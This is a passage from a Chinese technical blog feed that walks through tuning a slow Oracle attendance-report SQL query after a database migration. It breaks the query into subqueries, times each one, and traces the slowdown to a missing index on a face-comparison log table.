class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">prj.PROVINCE_AD_NAME,</span><br><span class="line">prj.CITY_AD_NAME,</span><br><span class="line">prj.AD_NAME,</span><br><span class="line">prj.CHANNEL_SYS_CAT,</span><br><span class="line">prj.EXCUTE_EL,</span><br><span class="line">prj.PRJ_CODE AS PRJ_CODE,</span><br><span class="line">prj.PRJ_NAME AS PRJ_NAME,</span><br><span class="line">prj.POS_CODE AS POS_CODE,</span><br><span class="line">prj.POS_NAME AS POS_NAME,</span><br><span class="line">prj.CUST_CHANNEL_CODE,</span><br><span class="line">prj.CUST_CHANNEL_NAME,</span><br><span class="line">prj.EMP_CODE AS EMP_CODE,</span><br><span class="line">prj.NAME AS EMP_NAME,</span><br><span class="line">prj.ATT_DATE AS APPLY_DATE,</span><br><span class="line">prj.EMP_PK AS EMP_PK,</span><br><span class="line">prj.ATT_START_TIME AS START_TIME,</span><br><span class="line">prj.ATT_END_TIME AS END_TIME,</span><br><span class="line">prj.ATT_ISWORK AS ISWORK,</span><br><span class="line">prj.ATT_UNWORK AS ATTTYPE,</span><br><span class="line">prj.START_XPOS AS ON_WORK_POSITION_LON,</span><br><span class="line">prj.START_YPOS AS ON_WORK_POSITION_LAT,</span><br><span class="line">prj.START_ISEXCEP AS ON_WORK_POSITION_STAUS,</span><br><span class="line">prj.END_XPOS AS OFF_WORK_POSITION_LAT,</span><br><span class="line">prj.END_YPOS AS OFF_WORK_POSITION_LON,</span><br><span class="line">prj.END_ISEXCEP AS OFF_WORK_POSITION_STAUS,</span><br><span class="line">ifcl1Staus.COMPARE_TYPE AS FACE_ATT_TYPE,</span><br><span class="line">ifcl1.STATUS AS FACE_ATT_STATUS,</span><br><span class="line">NVL( ifaceCount.faceCount, 0 ) AS FACE_ATT_COUNT,</span><br><span class="line">NVL( levLeave.LEAVECount, 0 ) AS LEAVE_WORK_COUNT,</span><br><span class="line">NVL( levRtn.RETURNCount, 0 ) AS RETURN_WORK_COUNT,</span><br><span class="line">wq.STATUS AS PRJ_QUESTION_TYPE,</span><br><span class="line">iface2.FACE_ATT_IMG AS FACE_ATT_IMG,</span><br><span class="line">prj.SA_TYPE</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">dpsi.ID AS ID,</span><br><span class="line">P.ID AS PRJ_ID,</span><br><span class="line">mad.AD_CODE,</span><br><span class="line">mad.PROVINCE_AD_NAME,</span><br><span class="line">mad.CITY_AD_NAME,</span><br><span class="line">mad.AD_NAME,</span><br><span class="line">mpk.POS_KIND_CODE,</span><br><span class="line">mpk.POS_KIND_NAME,</span><br><span class="line">P.CODE AS PRJ_CODE,</span><br><span class="line">P.NAME AS PRJ_NAME,</span><br><span class="line">P.START_DATE,</span><br><span class="line">p.END_DATE,</span><br><span class="line">dpsi.CUST_CHANNEL,</span><br><span class="line">dpsi.CUST_SYS,</span><br><span class="line">dpsi.CUST_CHANNEL_CODE,</span><br><span class="line">dpsi.CUST_CHANNEL_NAME,</span><br><span class="line">dcs.CHANNEL_SYS_CAT,</span><br><span class="line">dcs.CHANNEL_CAT_CODE,</span><br><span class="line">dcs.CHANNEL_AD_CODE,</span><br><span class="line">dcs.CHANNEL_PROVINCE_AD_CODE,</span><br><span class="line">dcs.CHANNEL_CITY_AD_CODE,</span><br><span class="line">dcs.ID AS POS_ID,</span><br><span class="line">dcs.CHANNEL_CODE AS POS_CODE,</span><br><span class="line">dcs.CHANNEL_NAME AS POS_NAME,</span><br><span class="line">dcs.LONGITUDE AS LONGITUDE,</span><br><span class="line">dcs.LATITUDE AS LATITUDE,</span><br><span class="line">dss.id AS SALES_ID,</span><br><span class="line">TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' ) AS sc_schedule_date,</span><br><span class="line">wor.SW_BEGIN_TIME AS SALES_WORK_START,</span><br><span class="line">wor.SW_END_TIME AS SALES_WORK_END,</span><br><span class="line">dss.SALES_EAT_START,</span><br><span class="line">dss.SALES_EAT_END,</span><br><span class="line">memp.EMP_PK,</span><br><span class="line">memp.EMP_CODE,</span><br><span class="line">dss.SALES_NAME AS NAME,</span><br><span class="line">dss.SALES_PHONE AS TEL,</span><br><span class="line">dss.SALES_CARD_ID AS ID_CARD,</span><br><span class="line">spp.PRJ_ATT_CHECK_TYPE,</span><br><span class="line">spp.ALLOW_LEAVE_TIME,</span><br><span class="line">e1.EMP_CODE AS EXCUTE_CODE,</span><br><span class="line">e1.emp_name AS EXCUTE_EL,</span><br><span class="line">e2.EMP_CODE AS CITY_CODE,</span><br><span class="line">e2.emp_name AS CITY_EL,</span><br><span class="line">e3.EMP_CODE AS AREA_CODE,</span><br><span class="line">e3.EMP_NAME AS AREA_NAME,</span><br><span class="line">dpsi.SCHEDULE_TYPE,</span><br><span class="line">sac.ATT_START_TIME,</span><br><span class="line">sac.ATT_END_TIME,</span><br><span class="line">sac.ATT_ISWORK,</span><br><span class="line">sac.ATT_UNWORK,</span><br><span class="line">sac.START_XPOS,</span><br><span class="line">sac.START_YPOS,</span><br><span class="line">DECODE( sac.START_ISEXCEP, 0, 2201, 1, 2202, 2, 2203, 3, 2204, 4, 2205, 2206 ) AS START_ISEXCEP,</span><br><span class="line">sac.END_XPOS,</span><br><span class="line">sac.END_YPOS,</span><br><span class="line">sac.END_ISEXCEP,</span><br><span class="line">sac.ATT_SCH_PK,</span><br><span class="line">sac.ATT_DATE,</span><br><span class="line">CASE</span><br><span class="line">WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">AND sac.ATT_END_TIME IS NOT NULL THEN '1'</span><br><span class="line">WHEN sac.ATT_START_TIME IS NOT NULL</span><br><span class="line">OR sac.ATT_END_TIME IS NOT NULL THEN '2'</span><br><span class="line">ELSE '2'</span><br><span class="line">END AS SA_TYPE</span><br><span class="line">FROM</span><br><span class="line">DM_PROJECT_SELLIN_INFO dpsi</span><br><span class="line">LEFT JOIN MD_EMP e1 ON</span><br><span class="line">dpsi.EMP_CODE = e1.EMP_CODE</span><br><span class="line">LEFT JOIN MD_EMP e2 ON</span><br><span class="line">dpsi.CITY_EMP_CODE = e2.EMP_CODE</span><br><span class="line">LEFT JOIN MD_EMP e3 ON</span><br><span class="line">dpsi.AREA_MANAGER_CODE = e3.EMP_CODE,</span><br><span class="line">DM_PROJECT P,</span><br><span class="line">DM_PROJECT_SELLIN_SALES dss,</span><br><span class="line">DM_CHANNEL_SYNC dcs,</span><br><span class="line">MD_EMP memp,</span><br><span class="line">SP_PRJ_PARM spp,</span><br><span class="line">Md_Admin_Div mad,</span><br><span class="line">MD_POS_KIND mpk,</span><br><span class="line">dm_sales_schedule_calendar cal,</span><br><span class="line">dm_sales_schedule_work wor,</span><br><span class="line">SP_ATT_SCH sac</span><br><span class="line">WHERE</span><br><span class="line">dpsi.PROJECT_ID = P.ID</span><br><span class="line">AND dss.id = cal.sales_id</span><br><span class="line">AND cal.schedule_work_id = wor.id</span><br><span class="line">AND dcs.CHANNEL_CAT_CODE = mpk.POS_KIND_CODE</span><br><span class="line">AND dss.PROJECT_SELLIN_INFO_ID = dpsi.ID</span><br><span class="line">AND dss.DELETE_FLAG = '0'</span><br><span class="line">AND dpsi.CHANNEL_SYNC_ID = dcs.ID</span><br><span class="line">AND LOWER( memp.EMP_S_CODE )= LOWER( dss.SALES_CARD_ID )</span><br><span class="line">AND P.IS_DELETE IS NULL</span><br><span class="line">AND memp.IS_DEL = '0'</span><br><span class="line">AND spp.PRJ_CODE = P.CODE</span><br><span class="line">AND mad.AD_ID = dcs.CHANNEL_ADMIN_DIV_ID</span><br><span class="line">AND mad.IS_DEL = '0'</span><br><span class="line">AND memp.EMP_TYPE = '1001'</span><br><span class="line">AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">AND TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">AND sac.PRJ_CODE = p.CODE</span><br><span class="line">AND sac.POS_CODE = dcs.CHANNEL_CODE</span><br><span class="line">AND sac.EMP_PK = memp.EMP_PK</span><br><span class="line">AND sac.ATT_DATE = TO_CHAR( cal.sc_schedule_date, 'yyyy-mm-dd' )</span><br><span class="line">AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&gt;='2018-04-01'</span><br><span class="line">AND TO_CHAR( sac.CRT_DATE, 'yyyy-mm-dd' )&lt;='2018-04-30'</span><br><span class="line">) prj,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">ifcl.STATUS</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">WHERE</span><br><span class="line">ifcl.HANDLE_TYPE = 0</span><br><span class="line">AND ifcl.DELETE_FLAG = '0'</span><br><span class="line">AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">GROUP BY</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">ifcl.STATUS</span><br><span class="line">HAVING</span><br><span class="line">AVG( STATUS )&lt; 1</span><br><span class="line">) ifcl1,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">EMP_PK,</span><br><span class="line">COMPARE_DATE,</span><br><span class="line">COMPARE_TYPE,</span><br><span class="line">ROW_NUMBER() OVER(</span><br><span class="line">PARTITION BY EMP_PK,</span><br><span class="line">COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">CREATED DESC</span><br><span class="line">) rn</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG</span><br><span class="line">WHERE</span><br><span class="line">COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">) t</span><br><span class="line">WHERE</span><br><span class="line">t.rn &lt;= 1</span><br><span class="line">) ifcl1Staus,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">COUNT(*) AS LEAVECount</span><br><span class="line">FROM</span><br><span class="line">SP_LEV_RPT</span><br><span class="line">WHERE</span><br><span class="line">SP_LEV_RPT.START_TIME IS NOT NULL</span><br><span class="line">GROUP BY</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">) levLeave,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK,</span><br><span class="line">COUNT(*) AS RETURNCount</span><br><span class="line">FROM</span><br><span class="line">SP_LEV_RPT</span><br><span class="line">WHERE</span><br><span class="line">SP_LEV_RPT.END_TIME IS NOT NULL</span><br><span class="line">GROUP BY</span><br><span class="line">SP_LEV_RPT.ATT_SCH_PK</span><br><span class="line">) levRtn,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">WX_QUESTION.PRJ_ID,</span><br><span class="line">DM_PROJECT.CODE,</span><br><span class="line">'Y' AS STATUS</span><br><span class="line">FROM</span><br><span class="line">WX_QUESTION,</span><br><span class="line">DM_PROJECT</span><br><span class="line">WHERE</span><br><span class="line">DM_PROJECT.ID = WX_QUESTION.PRJ_ID</span><br><span class="line">AND WX_QUESTION.IS_DEL = '0'</span><br><span class="line">AND WX_QUESTION.STATUS = '0'</span><br><span class="line">GROUP BY</span><br><span class="line">WX_QUESTION.PRJ_ID,</span><br><span class="line">DM_PROJECT.CODE</span><br><span class="line">) wq,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE,</span><br><span class="line">COUNT(*) AS faceCount</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifcl</span><br><span class="line">WHERE</span><br><span class="line">ifcl.HANDLE_TYPE = 0</span><br><span class="line">AND ifcl.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">GROUP BY</span><br><span class="line">ifcl.EMP_PK,</span><br><span class="line">ifcl.COMPARE_DATE</span><br><span class="line">) ifaceCount,</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE,</span><br><span class="line">wm_concat(</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">) AS OLD_PAR_VALUE,</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">) T</span><br><span class="line">)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">) AS FACE_ATT_IMG</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE,</span><br><span class="line">ifa.COMPARE_MSG,</span><br><span class="line">RANK() OVER(</span><br><span class="line">PARTITION BY ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">ifa.created DESC</span><br><span class="line">) rankno</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">WHERE</span><br><span class="line">ifa.HANDLE_TYPE = 0</span><br><span class="line">AND ifa.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">) iface</span><br><span class="line">WHERE</span><br><span class="line">iface.rankno &lt;= 3</span><br><span class="line">GROUP BY</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE</span><br><span class="line">) iface2</span><br><span class="line">WHERE</span><br><span class="line">prj.PRJ_NAME ='(2013)行政项目'</span><br><span class="line">AND prj.ATT_DATE &gt;='2018-04-01'</span><br><span class="line">AND prj.ATT_DATE &lt;='2018-04-30'</span><br><span class="line">AND prj.EMP_PK = ifcl1.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1.COMPARE_DATE(+)</span><br><span class="line">AND prj.EMP_PK = ifcl1Staus.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1Staus.COMPARE_DATE(+)</span><br><span class="line">AND prj.ATT_SCH_PK = levLeave.ATT_SCH_PK(+)</span><br><span class="line">AND prj.ATT_SCH_PK = levRtn.ATT_SCH_PK(+)</span><br><span class="line">AND prj.PRJ_CODE = wq.CODE(+)</span><br><span class="line">AND prj.EMP_PK = ifaceCount.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifaceCount.COMPARE_DATE(+)</span><br><span class="line">AND prj.EMP_PK = iface2.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.sc_schedule_date, 'yyyy-mm-dd' ), 'yyyymmdd' )= iface2.COMPARE_DATE(+)</span><br><span class="line">ORDER BY</span><br><span class="line">APPLY_DATE DESC,</span><br><span class="line">ATTTYPE DESC</span><br></pre></td></tr></table></figure><h2 id="SQL优化思路"><a href="#SQL优化思路" class="headerlink" title="SQL优化思路"></a>SQL优化思路</h2><p>SQL语句较复杂，8个子查询的left outer join，每个子查询中又有连接。思路如下：</p><ol><li>从外往内拆分子查询</li><li>老旧对比子查询执行计划和执行效率</li><li>子查询连接从1到2到3一直到8个联查对比，寻找瓶颈</li></ol><h3 id="拆分子查询"><a href="#拆分子查询" class="headerlink" title="拆分子查询"></a>拆分子查询</h3><table><thead><tr><th>子查询</th><th>老库 （秒）</th><th>新库（秒）</th></tr></thead><tbody><tr><td>prj</td><td>1.182</td><td>0.318</td></tr><tr><td>ifcl1</td><td>14.229</td><td>13.168</td></tr><tr><td>ifclStatus</td><td>15.739</td><td>16.769</td></tr><tr><td>levLeave</td><td>10.147</td><td>9.813</td></tr><tr><td>levRtn</td><td>9.148</td><td>8.3</td></tr><tr><td>wq</td><td>0.141</td><td>0.165</td></tr><tr><td>ifcl1Count</td><td>3.498</td><td>1.966</td></tr><tr><td>iface2</td><td>49.255</td><td>50.897</td></tr></tbody></table><h3 id="寻找瓶颈"><a href="#寻找瓶颈" class="headerlink" title="寻找瓶颈"></a>寻找瓶颈</h3><table><thead><tr><th>连接</th><th>老库（秒）</th><th>新库（秒）</th></tr></thead><tbody><tr><td>prj+ifcl1</td><td>1.522</td><td>1.129</td></tr><tr><td>+ifclStatus</td><td>2.343</td><td>1.957</td></tr><tr><td>+levLeave</td><td>2.525</td><td>1.955</td></tr><tr><td>+levRtn</td><td>2.658</td><td>1.653</td></tr><tr><td>+wq</td><td>2.561</td><td>1.999</td></tr><tr><td>+ifcl1Count</td><td>3.498</td><td>1.966</td></tr><tr><td>+iface2</td><td>11.124</td><td>383</td></tr></tbody></table><p>发现瓶颈出现在<code>iface2</code></p><h2 id="优化iface2"><a href="#优化iface2" class="headerlink" title="优化iface2"></a>优化iface2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE,</span><br><span class="line">wm_concat(</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">) AS OLD_PAR_VALUE,</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">) T</span><br><span class="line">)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">) AS FACE_ATT_IMG</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE,</span><br><span class="line">ifa.COMPARE_MSG,</span><br><span class="line">RANK() OVER(</span><br><span class="line">PARTITION BY ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">ifa.created DESC</span><br><span class="line">) rankno</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">WHERE</span><br><span class="line">ifa.HANDLE_TYPE = 0</span><br><span class="line">AND ifa.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">) iface</span><br><span class="line">WHERE</span><br><span class="line">iface.rankno &lt;= 3</span><br><span class="line">GROUP BY</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE</span><br></pre></td></tr></table></figure><p><code>IPG_FACE_COMPARE_LOG</code>表中<code>COMPARE_DATE列</code>需要新增索引。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>oracle小版本不同引起优化器无法获取相同的执行计划</li><li>索引缺失是本次的慢查询的主要原因</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：Oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒，如何进行复杂查询的SQL优化，本文提供通用的一个思路。&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="Oracle" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Oracle/"/>
    
    
      <category term="SQL优化" scheme="http://www.toberoot.com/tags/SQL%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MySQL一次惊心动魄地数据强制恢复</title>
    <link href="http://www.toberoot.com/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/"/>
    <id>http://www.toberoot.com/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/</id>
    <published>2018-05-16T19:58:02.000Z</published>
    <updated>2020-03-22T08:32:42.588Z</updated>
    
